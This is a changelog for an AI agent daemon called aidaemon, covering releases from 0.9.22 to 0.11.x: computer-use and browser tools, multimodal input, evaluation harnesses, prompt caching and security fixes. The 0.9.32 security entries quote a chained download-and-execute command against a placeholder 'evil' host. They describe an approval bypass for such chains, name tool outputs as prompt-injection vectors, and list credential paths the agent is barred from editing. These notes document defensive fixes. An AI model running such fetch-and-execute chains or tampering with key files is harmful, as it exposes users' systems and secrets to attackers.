- **Leaked running-task queue stall**: a task left `Running` past 1 hour (an abnormal channel-handler exit that never finalized it) is now reaped automatically instead of blocking the session's message queue forever — new messages stranded behind a phantom "running" task previously required a daemon restart. The `computer_use` approval wait was also lowered to 120s so it resolves to a clean denial well before the 300s tool-call watchdog, which was the collision that produced the leaked task.
- **computer_use clicks no longer need the app frontmost**: element clicks now use an AX press (`AXPress`) as the primary method, which activates the control directly without moving the real cursor or requiring the target window to be in the foreground — a GUI task succeeds even while the user is looking at another window. A synthetic cursor click (with the foreground guard) remains the fallback for controls that can't be AX-pressed and for raw coordinate clicks.

- **computer_use `screenshot` action**: a dedicated action that captures the target app window and delivers the image to the user's chat (and attaches it for the model), so an explicit "send me a screenshot" works instead of the model inventing an unknown action. Screenshots still attach automatically to every other action's result.
- **computer_use condensed refresh lists all interactive controls**: after a mutating action the refresh now shows every clickable control (capped, with an omission marker for dense apps) instead of only the first few. Previously the model couldn't see the buttons it needed next (e.g. a calculator's "9"/"+"/"=") and re-ran the expensive full `get_app_state` every step — which inflated iteration counts and burned the task token budget on simple GUI tasks.

### Observability

- **Per-action computer_use telemetry**: every `computer_use` action emits one structured event on the `computer_use` tracing target (action, app, snapshot generation, element index, duration, outcome, error, screenshot byte size, truncation) — no raw screenshots or typed text — so GUI-automation issues are greppable instead of needing ad-hoc instrumentation. A truncated-with-no-elements AX walk also logs the root role to distinguish a permission/degraded-tree failure from a genuinely deep app.

## [0.11.1] - 2026-06-09

### Added

- **read_file image vision**: reading JPEG, PNG, GIF, or WebP files attaches them as tool-origin images so the LLM receives pixels on follow-up turns (same synthetic observation path as browser screenshots).
- **Browser tool hardening**: session-scoped tab isolation, interactive action approvals, secret-safe fill/screenshot output, bounded waits, graceful reconnect/shutdown, and ~80 mock-backend contract tests. New observation actions `get_console_logs` and `get_network_errors` capture per-tab console output and network load failures (secret- and origin-redacted). Ignored real-Chrome smoke test: `cargo test --features browser browser_smoke_real_chrome -- --ignored --nocapture`.
- **Vision / image understanding**: user-uploaded images from Telegram, Slack, and Discord are lazily base64-encoded for the current turn and sent to vision-capable LLM providers (OpenAI-compatible passthrough, Anthropic/Gemini mappers). Structured `MessageAttachment` metadata is persisted alongside the existing `[File received: ...]` text stub. Configurable via `[files] vision_enabled`, `max_vision_image_mb`, and `vision_mime_types`. Graceful fallback to text-only when vision is disabled, files are missing, or the provider rejects image payloads.
- **Native audio input**: voice notes and audio file uploads are lazily encoded as OpenAI-style `input_audio` blocks for audio-capable models (OpenAI audio models with `modalities: ["text"]`, Gemini `inlineData`). Configurable via `[files] audio_enabled`, `max_audio_mb`, `audio_mime_types`, and `audio_model_patterns`. Graceful fallback to text stub + system hint when audio is disabled, the model is ineligible, or encoding fails. Multimodal token budgeting uses byte surrogates so large audio payloads do not explode context estimates.
- **Whisper STT fallback**: when native audio is skipped, optionally transcribe inbound audio with local `whisper-cli` (ffmpeg prep for OGG/Opus) and append `[Transcription of <file>]: ...` to the user message before the LLM turn. Configurable via `[files.stt]` (`enabled`, `cli_path`, `model_path`, `ffmpeg_path`, `language`, `max_audio_mb`, `timeout_secs`). Opt-in (`enabled = false` by default). Setup wizard probes whisper-cli/ffmpeg/model paths; `manage_config` `enable_stt` action auto-writes `[files.stt]` (optional `stt_cli_path`, `stt_model_path`, `stt_ffmpeg_path`, `stt_language`).
- **Browser screenshot vision**: browser `screenshot` actions save PNGs to the shared inbox and attach them to tool results so the LLM always receives pixels (synthetic user observation message at render time). Tool-origin images stay vision-eligible in archived turns for follow-up questions; user uploads remain current-turn-only.
- **Harness eval instrumentation (Phase A)**: per-task effectiveness snapshot on `TaskEnd` (`HarnessEvalSnapshot`) scoring routing accuracy, progress yield, contract fulfillment, and tier-weighted cost efficiency. Configurable via `[diagnostics.harness_eval]`; sub-agent metrics roll up into the parent task at spawn complete.
- **Harness eval offline suite (Phase B)**: YAML fixtures in `tests/harness_eval/fixtures/` with `cargo test --lib harness_eval` regression runner (`src/harness_eval/`).
- **Harness eval analysis tooling (Phase C)**: `db_probe --eval-task`, `--eval-summary`, `--record-fixture`; `diagnose` action includes Harness Effectiveness section when snapshot present.
- **Harness eval follow-ups**: orchestration direct-return metrics recorded before `TaskEnd` finalize; `TurnState` shares the eval accumulator handle; post-exec validation failures and terminal approval denials roll into quality metrics; `policy_metrics` exposes `harness_eval_tasks_total` and rolling `harness_eval_overall_avg`; CI runs `cargo test --lib harness_eval` explicitly; two new offline fixtures (`internal_maintenance_direct_return`, `orchestrator_fallthrough_status`) and stricter schedule direct-return expectations.
- **Harness eval phase wiring + fixture suite expansion**: bootstrap direct-return shortcuts (stop/cancel, time query, etc.) now install and finalize `HarnessEvalSnapshot`; message-build, tool-prelude, response-fallthrough, and stopping-phase signals (context drops, intent/evidence gates, budget extensions) roll into progress/routing payloads; YAML fixtures support `seed.goals`, `routing_models`, `stop_reason`, and `response_fallthrough`; 15 offline fixtures cover cancel, deferred-no-tool, repetition/stall guards, and orchestration fallthrough paths.

### Changed

- **Browser SSRF policy (Task 8)**: tool-initiated navigations are validated pre-flight and the final committed URL is revalidated after load (blocking redirect-to-loopback). Per-request CDP subresource/XHR/WebSocket interception remains **deferred** — chromiumoxide 0.8 has no safe per-request continue/abort seam; see the Task 8 feasibility note in `src/tools/browser/tests.rs`.

### Fixed

- **Harness eval telemetry on deferred/stall paths**: post-tool deferred loops now record `stall_guard_fires`; pre-tool deferred loops in the main completion guard record `deferred_no_tool_events`; false-capability-denial retries record stall guards.
- **Harness eval `contract_fulfilled` alignment**: boolean flag and `ContractFulfillmentPayload.fulfilled` now use the same obligation checks as `contract_fulfillment` scoring (no longer true when mutation was expected but missing).
- **Harness eval progress yield for chat turns**: clean 1–3 iteration conversational successes get modest non-zero progress credit instead of always scoring 0.00.
- **Post-tool deferred recovery**: first deferral after successful tools tries structured tool-output completion before another LLM iteration; memory-related false-capability-denial phrases (`don't have that in my records`, etc.) trigger the same recovery path.
- **Richer `db_probe --eval-task` output**: reports deferred-no-tool count, no-progress iterations, contract obligation fields, and validation/error flags.
- **Bootstrap stop/cancel missing harness eval snapshot**: exact `stop`/`cancel`/`abort` commands handled in bootstrap returned `TaskEnd` without `harness_eval`, breaking offline fixtures and `db_probe --eval-task` for those paths.

## [0.11.0] - 2026-06-08

### Added

- **`[tools].disabled` config**: omit built-in tools at startup by machine name (requires `/restart`). **Off by default:** `git_info`, `git_commit` (use `run_command`/`terminal`), `policy_metrics`, `check_environment`, `service_status`, `project_inspect` (use `read_file`/`search_files`/`terminal`), `read_channel_history` (Slack channel history; opt-in), `tool_trace` (redundant alias — use `goal_trace` with `action: "tool_trace"`). Set `disabled = []` to register all base tools. Optional: add `goal_trace` to disable forensics entirely.
- **`[health].enabled` defaults to `false`**: the `health_probe` tool and background uptime monitor are opt-in. Set `enabled = true` and add `[health].probes` (or let the agent create probes) when you want scheduled service checks and failure alerts.
- **`[cli_agents].enabled` defaults to `false`**: `cli_agent` and `manage_cli_agents` are opt-in (~1.6k schema tokens combined). Set `enabled = true` when you want aidaemon to delegate to installed CLI coding agents (Claude Code, Codex, etc.).
- **`[diagnostics].enabled` defaults to `false`**: the `self_diagnose` tool is opt-in (~560 schema tokens). `record_decision_points` stays on by default; use `db_probe`, the dashboard, or CLI agents for operator debugging.
- Sliding-window cache-reuse observability (Phase 0): per-LLM-call prefix fingerprint (`info!`) with region sub-hashes (system prompt, pre-boundary history, tool definitions, session summary) plus `force_text`/boundary metadata, a window-decision log tying `keep_from` movement to fetch mechanics, an explicit per-build window-boundary movement event (`old_keep_from`/`new_keep_from` plus old/new oldest-kept message ids, emitted on every build so the boundary signal is continuous across trim and no-trim paths), split window-trim counters distinct from age-based collapse, and per-stage pre-boundary fingerprints (`debug!`) across the full message-build pipeline so prefix-cache breaks can be attributed to the exact transform that changed the prompt. Hashes never include raw message content.
- **Opt-in LLM request payload dumps**: setting `AIDAEMON_DUMP_LLM_REQUESTS=1` (default `llm_request_dumps/` directory) or `AIDAEMON_DUMP_LLM_REQUESTS=/path/to/dir` writes each finalized provider request (messages + tool definitions + model/iteration metadata) as a pretty-printed JSON file, so the exact composition of input tokens can be inspected. Dumps contain raw conversation content — local debugging only.
- **Stable system-prompt core + per-session core cache (Pillar A** of the cross-turn prefix stability design): the system prompt is split into a byte-stable "core" (message zero) and a `[Task Context]` tail inserted at the turn boundary, with a per-session cache that reuses the rendered core verbatim across turns and logs the changed component on invalidation. The largest, most expensive prefix region is now byte-identical across turns, so a prompt-caching backend can reuse its KV instead of re-evaluating it every turn.
- **Turn-anchored conversation history (Pillar B**): the message-count sliding window is replaced by whole-turn fetch / render / eviction. Archived turns are rendered once into a byte-stable permanent form (keyed by a content fingerprint), fetched by an immutable per-turn sequence (`MIN(events.id)` — timestamps are never an ordering key), and evicted whole-turn at an in-memory anchor against an archived-region token budget, so `core + archived[..N-1]` is byte-identical across turns and every remaining prefix break is an eviction, a logged `Prefix mutation`, or a logged late-write re-render. Adds an idempotent `turn_id` column + index on conversation events; legacy `turn_id = NULL` rows are covered by the session summary.
- **Opt-in llama.cpp slot routing** (`[provider.slot_routing]`): pins interactive generation to a dedicated KV-cache slot (`id_slot`) so always-on background tasks (memory consolidation, summarization, etc.) cannot evict the interactive conversation's cache between turns. Default off and cloud-API-safe (no `id_slot` is sent when disabled); requires a local `llama-server` started with `--parallel >= 2`. **Operational note:** sliding-window-attention models (e.g. Gemma) additionally require `llama-server --swa-full` for cross-turn KV reuse — without it llama re-processes the full prompt every turn regardless of prefix stability; size `-c` to cover the added KV memory of the full-size SWA cache.

### Changed

- **Per-call LLM payload reduced 27%** (median 22.3k → 16.2k tokens; Pillar C
  of the cross-turn prefix stability design): the duplicative `## Tools`
  catalog in the system prompt (−16.9k bytes) was replaced by compact
  routing, delegation, and runtime API guidance with all load-bearing rules
  migrated into the owning tool schemas, and eleven admin-tool schemas were
  compressed (−4.1k bytes) under test-enforced byte budgets. Tool roster
  membership is unchanged; tool-selection behavior verified by integration
  suites and a live smoke.

- **Background terminal completion no longer dumps raw stdout**: when a backgrounded command finishes, the user now gets a short "Background terminal command completed after Ns" status ping, and the actual output is fed back through the agent so it returns a formatted, summarized reply. The raw output is only delivered verbatim (in a code block) as a fallback when the agent re-engagement is unavailable or produces nothing, so content is never lost.

### Removed

- **Message-count sliding window / age-ladder** (Prior-1/Prior-2 collapse, the adaptive window-size trim, the `current_user_injected` synthetic-user path, and the index-based identity-preserve bypass): superseded by Pillar B's turn-anchored history. Conversation-history retention is now governed solely by the whole-turn anchor budget, and identity-critical content survives verbatim at turn granularity inside the renderer.

### Fixed

- **Approving a proposed tool action no longer fails with "I ran into a processing limit"**: a short affirmation ("Yes, try that", "go ahead", "do it") replying to an assistant that just *offered* to run a tool was contracted as a text-only turn (the bare affirmation carries no action signal — the intent lives in the prior turn), so the drift guard blocked the approved tool and the turn spun into force-text and hit the safety net. The plain-text gate is now approval-aware: a short approval whose preceding assistant message proposed an action keeps tools enabled, so the daemon executes the action it offered instead of refusing it.
- **Background-deferred tasks are no longer scored `failed`**: when a long command exceeds the run window and is moved to the background (with a "result will be sent when it finishes" ack), the turn is a *deferral*, not a failure — but the outcome scorer had no background-handoff awareness and scored it `failed`. `TaskOutcomeDerivation` now reads `background_handoff_active` and returns `partial` for a deferred-to-background turn (a genuine model error still outranks it and fails).
- **Live tool-activity pings no longer leak internal tool names or raw commands**: progress updates ("Using …", "✓ …") streamed raw internal tool names (`spawn_agent`) and full shell commands with absolute paths, bypassing the reply sanitizer. Tool names are now mapped to friendly labels (`spawn_agent` → "delegating to a specialist", `terminal` → "running a command", etc.), command summaries are dropped (label only), and other summaries are run through secret redaction + char-safe truncation.
- **`[Action completed]` placeholder no longer leaks to users**: the internal sliding-window placeholder for orphaned tool-call-only turns is now stripped from user-facing replies, and consecutive placeholders are collapsed to a single one in the model's context (in both the live message-build path and the skeleton-extraction path). Flooding the context with identical placeholders was inviting the model to regurgitate them verbatim.
- **Degeneration/repetition guard on final replies**: a new conservative guard collapses runaway model repetition loops (4+ consecutive identical lines or repeated sentence cycles) before a reply is sanitized and sent, preventing the wall-of-duplicated-text + chunked-message spam seen when a model (especially a local one) collapses into a loop.
- Marked the encryption-only `db_probe` diagnostic binary as feature-gated so `cargo binstall aidaemon` accepts release archives that contain only the main `aidaemon` executable.
- **Re-typing the same message is no longer dropped as a duplicate**: message dedup now keys on the channel's stable per-message identity (Telegram `message_id`, Slack `ts`, Discord message id) instead of hashing the text. Webhook/poll redeliveries of the *same* message (which reuse the id) are still suppressed, but a user deliberately re-sending the same text (which gets a new id) is treated as a fresh request. Falls back to content hashing when no id is available.
- **Pronoun follow-ups no longer bind to the pinned core-profile person**: a follow-up that carries its subject only via a third-person pronoun ("…what can you infer about her?") was prone to a coreference hijack — small models bound the pronoun to whoever was most salient in the injected core profile (e.g. the pinned partner) instead of the actual subject of the prior exchange. The loop now detects this shape, anchors the pronoun to the immediately preceding exchange, and forces a memory lookup before answering, returning "I don't know" rather than substituting a different person.
- **Clearer message when a terse request can't be turned into an action**: the force-text safety net no longer emits the misleading "I ran into a processing limit" when the real cause is an under-specified request (e.g. a bare "web search" with no query) that never produced a tool call. It now asks for the missing detail instead.

## [0.10.0] - 2026-06-05

### Added

- **Dialogue-state tracking wired in**: the previously uncompiled dialogue-state feature is now live — `DialogueStateStore` trait defined and included in the `StateStore` facade, `dialogue_states` table created by migration, runtime rebuild/record functions compiled, and `part_13_dialogue_state` integration tests included in the suite.
- **Specialist prompt overhaul**: specialists share a common `_executor_base.md` core with per-kind sections; `spawn_agent` descriptions nudge delegation when work fits a specialist.

### Changed

- **Agent internals decoupled (no user-facing behavior change)** — completion of the architecture campaign started in v0.9.0:
  - The ~60 loose mutable variables in the agent loop now live in 8 per-concern state structs (`StallTracker`, `FailureLedger`, `RecoveryState`, `BudgetTracker`, `EvidenceLedger`, `ReflectionState`, `PendingDirectives`, `LoopCounters`) composed in a `TurnState`, with per-phase projections.
  - All nine loop phases (bootstrap, orchestration, message build, LLM, response, completion, stopping, tool prelude, tool execution) are free functions with explicit `Ctx` inputs and `Outcome` results — no more extension-method sprawl on the `Agent` struct (31 `impl Agent` blocks reduced to 13, each justified).
  - `runtime/history.rs` (4,117 lines) split into `followup`, `completion_contract`, `turn_context`, `project_scope`, and `notes` modules; `agent/mod.rs` shrunk from 4,233 to ~800 lines; no file in `src/agent/` exceeds ~2,000 lines.
  - Outer ring: deferred cycle-breaking wiring consolidated into `startup/wiring.rs`; new `ApprovalBroker` type replaces the raw approval channel sender threaded through 21 files; Telegram bootstrap-signing and approval rendering extracted from `telegram.rs`; six tools narrowed from the full `StateStore` facade to the specific store sub-trait they use.
  - Verified behavior-preserving by characterization tests (stall, force-text, completion blocking, truncation recovery, background ack) and an identical 2,294-test green suite at every slice.

## [0.9.35] - 2026-05-10

### Changed

- **Conversation boundary detection now uses explicit turn IDs**: `Message` gains a `turn_id: Option<String>` field. At the start of each turn, the agent generates a per-session turn id (set to the user message's own id) and stashes it on `Agent::current_turn_ids`. Every message persisted during the turn — assistant replies, tool results, synthetic injections — is auto-stamped by `append_message_canonical` reading from that map. `message_build_phase` then finds the current-task boundary by `turn_id` match instead of inferring from message content, which had a known race where the same text sent twice could anchor on the wrong instance and keep an unrelated tool chain as "current interaction." Content match is retained as a fallback for messages from before this field existed (NULL turn_id, or hydrated from events).

### Fixed

- **`test_compaction_fires_on_window_overflow` flake under coverage instrumentation**: The Turn 8 assertion took `call_log.last()` and used a 200ms post-turn sleep. Under slow runners (coverage), `last()` could land on an async compaction call rather than the main Turn 8 call, missing the `[Session Summary]` marker. The check now scans the last 4 calls so order doesn't matter, and the sleep matches the 1000ms used by the earlier assertion in the same test.

## [0.9.34] - 2026-05-10

### Added

- **LLM intent classifier (module + empirical bench)**: New `agent::llm_classifier` module exposing `classify_intent()`, a fail-open fast-model call that returns a coarse-grained intent class (`schedule_one_shot`, `schedule_recurring`, `memory_storage`, `memory_recall`, `action`, `knowledge_question`, `other`). Hard 5-second timeout, output capped at 20 tokens via `ChatOptions::max_tokens_override` so per-call cost stays trivial, token usage tracked under `background:intent_classifier`. Ships with 9 unit tests (parse, round-trip, timeout, fail-open, prompt-vocabulary invariants).
- **`intent_classifier_bench` ignored integration test**: Runs the classifier against a 27-case hand-curated corpus and reports agreement vs the heuristic baseline plus per-call latency. Run with `cargo test --lib intent_classifier_bench_run_corpus -- --ignored --nocapture`. Initial result on `google/gemini-2.5-flash` via OpenRouter: 88.9% agreement, 462ms average latency, 0 failures. Disagreements include legitimate LLM wins on implicit fact-sharing the regex misses, and one heuristic win on a compound recall+action task. Conclusion: the LLM classifier is good as a shadow signal but not good enough at this latency to replace the heuristic. A follow-up release will wire it as fire-and-forget shadow mode (off by default).

## [0.9.33] - 2026-05-10

### Changed

- **Centralized intent keyword constants**: Memory-storage / scheduling vocabulary previously duplicated between `intent_routing::is_memory_storage_intent` and `policy::recall_guardrails::looks_like_personal_memory_store_request` now lives in a single `intent_keywords` module. Two precision levels (strict multi-word phrases, lenient single-word verbs) make the false-positive trade-off explicit per call site. Fixes a recurring drift pattern where adding a verb in one detector silently bypassed the other. Invariant test guards against future drift.

## [0.9.32] - 2026-05-10

### Security

- **`manage_memories.forget` empty-key wipe (critical)**: An empty or whitespace-only `key` to the `forget` action made `fk.contains(&key_lower)` true for every fact, and the "duplicate sweep" then deleted matches across all categories — a malformed call could wipe the entire active fact store. Now rejects empty/whitespace keys and keys shorter than 2 characters. Cross-category sweeps are restricted to exact/canonical matches only; substring matching is allowed only within the explicitly-requested category. Regression tests added.
- **Terminal chained-command session approval leakage (high)**: Approving a chained command like `curl … | python3 …` with "Allow Session" previously stored each segment's binary (`curl`, `python3`) as a session-approved prefix, so any future chained command composed of the same binaries was auto-allowed (e.g. `curl evil | python3 evil`). Chained-command approvals now store the full trimmed command for exact-match only. `is_allowed`'s per-segment check no longer consults session approvals — only operator-configured permanent prefixes — so a simple `curl` session approval can't retroactively unlock arbitrary chains. Regression tests added.
- **`terminal` and `read_channel_history` no longer "trusted"**: Their outputs are now wrapped as untrusted external data before being fed back to the LLM. `terminal` can fetch arbitrary remote bytes (e.g. via `curl`); `read_channel_history` returns messages authored by other (non-owner) users. Both are prompt-injection vectors and were incorrectly exempt from wrapping. Regression tests added.
- **`edit_file` blocks sensitive paths**: `edit_file` now refuses to operate on `~/.ssh/*`, `~/.aws/*`, `~/.gnupg/*`, `*.env`, and other paths flagged by `fs_utils::is_sensitive_path` — matching `write_file`'s existing behavior. Without this guard, the agent could mutate SSH keys or env files in place via find-and-replace. Regression test added.
- **`run_command` allowlist tightened**: Removed `cargo run`, `cargo bench`, `npm run`, `npx`, `yarn run`, `bun run`, `make`, `cmake`, `gradle`, `mvn`, and `go generate` from `SAFE_PREFIXES`. These all execute arbitrary repo-defined scripts or network-downloaded code and must go through the terminal approval flow. Regression tests added.

### Changed

- **Rust toolchain**: Updated to Rust 1.95.0 (from 1.94.0).
- **Dependency updates**: ~90 crate dependencies bumped to latest compatible versions via `cargo update` — notably tokio 1.52.3, hyper 1.9.0, mio 1.2.0, rayon 1.12.0, rustls 0.23.40, uuid 1.23.1, wasm-bindgen 0.2.121, indexmap 2.14.0, proptest 1.11.0, openssl 0.10.79. Incompatible major bumps (keyring 4, reqwest 0.13, rand 0.10, sha1/sha2/hmac/hkdf 0.11/0.13) deferred — they require non-trivial code migrations.



### Added

- **Plan detection heuristics**: Automatic detection of multi-step tasks, high-stakes operations (deploy, publish, release, migrate), sequential markers, and verification requirements — injects structured execution guidance into the agent loop.
- **Plan suggestion system directive**: New `PlanSuggestion` variant in `SystemDirective` injects plan hints for both simple and complex intents via orchestration routes.
- **Pre-flight and verification guidance**: Orchestrator spawn prompt now includes mandatory prerequisite checks before external-state mutations and post-execution verification steps.
- **Expanded budget keywords**: Added `fixing`, `retry`, `redo`, `rerun`, `try again`, `do it again` to budget tier selection and completion signal inference for better task classification.

### Changed

- **Rust toolchain**: Updated to Rust 1.94.0 (from 1.93.0).
- **Dependency updates**: 89 crate dependencies updated to latest compatible versions — notably tokio 1.50.0, chrono 0.4.44, futures 0.3.32, rustls 0.23.37, uuid 1.22.0, serde_with 3.18.0, image 0.25.10.
- **Standard budget wall clock**: Increased from 600s to 900s to prevent premature budget exhaustion on slower models.
- **`contains_keyword_as_words` visibility**: Widened from `pub(super)` to `pub(crate)` for reuse in plan detection module.
- **Plans detection module**: Made `pub` for access from orchestration routes.

### Fixed

- **`generic-array` deprecation warnings**: Suppressed deprecation warnings for `GenericArray::from_slice` and `as_slice` in `terminal_bridge.rs` crypto code (upstream `generic-array` 0.14.9 deprecates in favor of 1.x API).

## [0.9.28] - 2026-03-19

### Added

- **Sliding window context management**: New `sliding_window` module with deterministic 1-line tool result summaries (e.g., "terminal: cargo test -> exit 0") for compact context preservation.
- **Adaptive sliding window**: Budget-aware `calculate_window_size()` replaces brittle `is_new_task` branching — returns min(5, pairs fitting in 30% of available token budget).
- **Age-based tool result clearing**: 3-tier system replaces binary keep/drop — current interaction keeps all, Prior 1 gets 1-line summaries, Prior 2+ drops entirely.
- **Compaction module**: Trigger detection (idle gap, file upload, window overflow), pending-pair tracking with cap of 3, LLM-based summarization prompts (initial and incremental modes).
- **Skeleton extraction**: `extract_skeleton()` utility for future compaction module use.

### Changed

- **Orphaned assistant messages preserved**: Messages with all tool_calls stripped now get "[Action completed]" content instead of being dropped, preventing dangling user messages that trigger completion compulsion.
- **Identity-critical tool results exempt from summarization**: Tool results critical to identity/context are preserved verbatim through the sliding window.

### Fixed

- **Integration test updates**: 6 tests updated for sliding window context changes — task boundary markers, critical facts format, mutation-contract nudge iterations, reflection test assertions.

## [0.9.27] - 2026-03-14

### Added

- **Task-start planning**: LLM-driven planning call before the main loop generates a structured `TaskPlan` with goal, steps, tool hints, and success criteria. Installed as a `LinearIntentPlan` and injected into the model context each iteration.
- **Budget promotion for multi-step plans**: When a captured task plan has 3+ steps and the initial budget tier is None/Small, the budget is promoted to Standard to avoid premature exhaustion.
- **Dialogue state persistence**: New `DialogueState` system tracks open questions, user responses, and resolution status across turns. Stored in SQLite via `dialogue_state` table.
- **Scheduled goals tool**: New `ScheduledGoalsTool` for managing scheduled goal operations directly.
- **`display_tool_call()` helper**: Converts raw tool call strings (e.g. `manage_memories(search)`) to human-friendly display names that survive sanitization.
- **Task plan context injection**: Each loop iteration receives the current plan as a `TaskPlanContext` system directive.
- **Terminal background command re-engagement**: After sending completion notifications, the terminal tool re-engages the agent via `handle_message()` with a synthetic follow-up containing the command output for analysis.

### Changed

- **Blocked/partial result messages include plan progress**: `build_reduce_scope_request` and `build_partial_done_blocked_request` now include plan step completion status and remaining work from the linear intent plan.
- **Activity summaries use `display_tool_call()`**: Background detach summaries in `stopping_phase.rs` now use human-friendly display names instead of raw tool call format, preventing the sanitizer from stripping them to "that".
- **Skills matching simplified**: Removed redundant matching logic in `skills/mod.rs`.
- **Telegram channel cleanup**: Simplified message handling logic.
- **Guard thresholds adjusted**: Tool execution guards updated for better multi-step task support.

### Fixed

- **Sanitizer stripping activity summaries**: Raw `tool_name(args)` format in activity summaries matched `strip_tool_name_references()` regex, replacing all entries with "that". Fixed by using `display_tool_call()`.
- **Background command notifications without agent analysis**: Completion notifications were sent to the user as raw output with no agent processing. Agent now re-engages to analyze the output.

## [0.9.26] - 2026-03-13

### Added

- **Outcome ledger**: Structured `OutcomeEntry` records for every tool call attempt, tracking success/failure, HTTP status, external mutation flag, and planned step association. Powers deterministic reconciliation at completion time.
- **Linear intent plan**: `LinearIntentPlan` with ordered `LinearIntentStep` entries allows the execution state to track multi-step workflows (e.g. "post 5 tweets"), advancing a cursor after each external success.
- **Outcome reconciliation at completion**: When external mutations fail, a two-pass reconciliation injects verified facts into the LLM context and validates the reply against the ledger. If the reply misrepresents the outcome (wrong ratios, claims unqualified success despite failures), a system-generated fallback reply is used instead.
- **`ReconciliationOverview`**: Structured summary with attempt-level or planned-step-level mode, success/failure counts, and failed step indices for precise outcome reporting.
- **Heartbeat liveness check**: Heartbeat loop now detects and logs when the event loop appears stalled.
- **`ToolSemantics.external_mutation` field**: Explicit flag for tools that mutate external state, used by the outcome ledger to distinguish reads from writes.
- **System directive `OutcomeReconciliation`**: Injects verified reconciliation facts into the LLM context during the completion phase.

### Changed

- **Completion phase handles failed external mutations before observation contract**: Failed external mutations now block completion independently and trigger reconciliation before the standard verification flow runs.
- **`http_request` response handling improved**: Better structured error extraction, HTTP status propagation to outcome ledger, and response truncation for large payloads.
- **System directive detection in completion**: Internal directives (`[SYSTEM]`, `[CONTENT FILTERED]`) are now classified as trivial tool output to prevent them from leaking as user-facing replies.
- **Terminal tool propagates external mutation semantics**: Terminal commands with external side effects are tracked in the outcome ledger.
- **Sanitization expanded**: New patterns for filtering leaked internal reconciliation markers from user-facing output.
- **Tool prelude phase supports linear intent plan installation**: Detected multi-step external workflows get a structured plan installed into execution state before the first tool call.
- **Turn context tracks explicit scheduled-run and multi-target intent patterns**: History-based scope extraction improved for batch/multi-target requests.

### Fixed

- **LLM claiming "all succeeded" when some external mutations failed**: Outcome reconciliation detects misrepresented success claims and substitutes a system-verified reply.
- **Completion loop deadlocked when verification required but tools unavailable**: Verification pending flag is now cleared when tools cannot run, with the partial result surfaced to the user.

## [0.9.25] - 2026-03-12

### Changed

- **Project scope extraction uses explicit paths only for current message**: Contextual nickname matching (e.g. "modern" resolving to `modern-plants-site`) is now skipped for the current user message to prevent false positives from common English words. Only explicit filesystem paths (`~/foo`, `/foo`, `./foo`) are extracted. History messages still use nickname matching.
- **Primary project scope prefers text order over disk existence**: For current-turn scopes, the first extracted scope (text order) is used instead of preferring scopes that exist on disk. This fixes new-project creation where a false-positive match to an existing directory would override the user's explicit path.
- **Scope-lock uses only user-explicit project scope**: `allowed_project_scope` no longer falls back to `known_project_dir` (inferred from tool results). This prevents history context pollution from locking the agent to the wrong project.
- **Project dir injection no longer updates `known_project_dir`**: `resolve_injected_working_dir` fallback to a parent directory could downgrade from the correct target to a parent, causing subsequent tool calls to latch onto unrelated projects.
- **`http_request` budget cap raised to 15**: Multi-step API workflows (posting threads, paginated APIs, auth+retry) legitimately need more sequential calls than the generic 8-call cap.
- **CI workflows bumped to `actions/checkout@v5`**: Silences the Node.js 20 deprecation warning.

### Fixed

- **New project creation scoped to wrong existing project**: When creating a new project (e.g. `ai-news-hub-2026`), common words in the prompt could match existing project directories, causing the agent to scope-lock to the wrong project and edit files there instead.
- **Budget exhaustion logging missing context**: Added session_id, task_id, iteration, and outcome to budget exhaustion and tool blocking warnings for easier debugging.

## [0.9.24] - 2026-03-12

### Added

- **`trigger_now` action for `manage_memories`**: Manually dispatch scheduled goals without waiting for the next cron tick.

### Fixed

- **Sub-sessions blocked by plain-text enforcement policy**: Spawned TaskLead/Executor agents were subject to the plain-text policy, which blocked terminal calls when the task description lacked known action verbs. Sub-sessions now always bypass this check.
- **Scheduled goals restricted to management tools only**: Cron-triggered tasks were missing terminal/write_file/browser access. TaskLead and Executor agents spawned for scheduled goals now receive full tools.
- **Validation rounds not extended by progress**: `max_validation_rounds` was the only budget dimension not extended by `extend_budget_on_progress()`, causing productive multi-step runs to hit budget exhaustion after just 3 completion-verification cycles.
- **Missing action verbs in policy signals**: Added pull, push, run, execute, fetch, merge, start, stop, compile, download, clone, migrate to the `asks_change` signal list.

## [0.9.23] - 2026-03-12

### Added

- **Non-resolving confirmation shortcut**: Bare "yes"/"ok"/"go ahead" replies to assistant questions that require a specific answer (which/what/or-choices) now get a direct follow-up requesting the actual choice instead of entering the full agent loop.
- **Progress-based budget extension**: Each successful tool execution extends the budget (LLM calls, tool calls, steps, wall-clock time), so productive multi-step runs are never artificially stopped by the initial budget ceiling.
- **Successful tool calls count as concrete work**: The stopping phase now considers any successfully completed tool call as concrete execution, preventing premature abandon when tools execute but their effects don't classify as observation/mutation (common for MCP tools).

### Changed

- **Pre-execution planning no longer charges budget**: Planning and critique passes are system-initiated quality checks — they no longer count against the agent's LLM call and validation round budget.
- **Budget tier limits raised**: None tier LLM calls 8→14, validation rounds 1→3; Small tier steps 12→16, LLM calls 10→14, tool calls 10→14, validation rounds 2→3.
- **Clarification question detection expanded**: "want me to" and "shall i" now recognized as clarification patterns for followup classification.

### Fixed

- **Productive runs stopped by tight budget**: Runs with successful tool calls were budget-exhausted even though every call succeeded. Progress-based extension ensures productive work continues.

## [0.9.22] - 2026-03-11

### Added

- **Reflection feedback loop**: New `reflection.rs` module watches for repeated tool errors with the same semantic signature, invokes the LLM as a diagnostician to analyze root cause and suggest a fix, persists the learning as an `ErrorSolution`, and verifies on the next successful call that the solution was actually applied.
- **Evidence state tracking**: New `EvidenceState` records concrete observations (file reads, command output, API responses, verification results) per turn, supports pre-execution evidence gates blocking premature writes, and provides contradiction detection.
- **Execution state machine**: New `ExecutionState` / `StepExecutionPlan` / `StepExecutionOutcome` hierarchy that selects a budget tier at turn start, tracks plan version, idempotency keys, and background-handoff flags, and can suspend its own budget for a force-text closeout.
- **Validation state**: New `ValidationState` records matched success criteria, failed checks (`BudgetExhausted`, `ScopeViolation`, `PlanRejected`, etc.), and exposes helpers for building structured `ExecutorStepResult` / `PartialResult` / blocker payloads.
- **Pre-execution planning and critique gate**: LLM-driven planning pass before the first tool call generates a `PlanState` (goal, first action, success criteria), a critique pass checks it, and both are logged as decision events.
- **Execution replay notes and diagnose surfacing**: `LearningContext` accumulates `ReplayNote` entries during a turn; `DiagnoseTool` builds an `ExecutionReplaySummary` from decision-point events.
- **Execution checkpoint in context window**: When history is trimmed, an `[SYSTEM] EXECUTION CHECKPOINT` message is injected summarising the active request, completed work, and latest evidence.
